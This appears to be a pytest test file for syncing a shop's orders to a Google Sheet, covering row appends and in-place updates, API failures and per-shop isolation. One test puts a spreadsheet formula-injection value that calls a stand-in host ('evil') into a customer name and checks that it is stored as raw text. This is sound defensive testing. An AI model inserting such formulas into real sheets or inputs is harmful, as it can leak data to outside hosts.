from __future__ import annotations

from collections.abc import Sequence

import pytest
from sqlalchemy.orm import Session

from app.enums import Actor, OrderStatus
from app.services.orders import transition
from app.services.sheets import HEADER, order_row, sync_shop
from tests.factories import make_customer, make_order, make_shop

S = OrderStatus


class FakeSheet:
    def __init__(self, fail: bool = False) -> None:
        self.rows: list[list[str]] = [HEADER]
        self.calls = 0
        self.fail = fail

    def order_rows(self) -> dict[str, int]:
        self.calls += 1
        if self.fail:
            raise RuntimeError("Google API down")
        return {r[0]: i for i, r in enumerate(self.rows, start=1) if r[0] != "ID"}

    def update_rows(self, updates: Sequence[tuple[int, list[str]]]) -> None:
        for row, values in updates:
            self.rows[row - 1] = values

    def append_rows(self, rows: Sequence[list[str]]) -> None:
        self.rows.extend(rows)


@pytest.fixture
def shop(db_session: Session):  # type: ignore[no-untyped-def]
    return make_shop(db_session, google_sheet_id="1AbCdEf_sheet")


def test_new_orders_appended_then_updated(db_session: Session, shop) -> None:  # type: ignore[no-untyped-def]
    sheet = FakeSheet()
    o1 = make_order(db_session, shop)
    o2 = make_order(db_session, shop)
    db_session.commit()

    assert sync_shop(db_session, shop, sheet) == 2
    assert [r[0] for r in sheet.rows] == ["ID", str(o1.id), str(o2.id)]
    assert sheet.rows[1][2] == "Nouvelle"
    assert sync_shop(db_session, shop, sheet) == 0  # nothing changed

    transition(db_session, o1, S.AWAITING_CONFIRMATION, Actor.BOT)
    db_session.commit()
    assert sync_shop(db_session, shop, sheet) == 1
    assert len(sheet.rows) == 3  # updated in place, not appended
    assert sheet.rows[1][2] == "En attente"


def test_failure_keeps_orders_dirty(db_session: Session, shop) -> None:  # type: ignore[no-untyped-def]
    order = make_order(db_session, shop)
    db_session.commit()
    assert sync_shop(db_session, shop, FakeSheet(fail=True)) == 0
    assert order.sheet_dirty is True
    assert sync_shop(db_session, shop, FakeSheet()) == 1
    assert order.sheet_dirty is False


def test_shop_without_sheet_is_skipped(db_session: Session) -> None:
    shop = make_shop(db_session)
    make_order(db_session, shop)
    sheet = FakeSheet()
    assert sync_shop(db_session, shop, sheet) == 0
    assert sheet.calls == 0


def test_row_content_raw(db_session: Session, shop) -> None:  # type: ignore[no-untyped-def]
    customer = make_customer(
        db_session, shop, name='=IMPORTXML("http://evil")', phone_e164="+21698123456"
    )
    order = make_order(db_session, shop, customer, city="Sfax")
    row = order_row(order, "Africa/Tunis")
    assert len(row) == len(HEADER)
    assert row[3] == '=IMPORTXML("http://evil")'  # kept as text: written with RAW input option
    assert row[4] == "+21698123456" and row[5] == "Sfax"


def test_only_own_shop_orders(db_session: Session, shop) -> None:  # type: ignore[no-untyped-def]
    other = make_shop(db_session, google_sheet_id="other")
    make_order(db_session, other)
    mine = make_order(db_session, shop)
    sheet = FakeSheet()
    sync_shop(db_session, shop, sheet)
    assert [r[0] for r in sheet.rows[1:]] == [str(mine.id)]
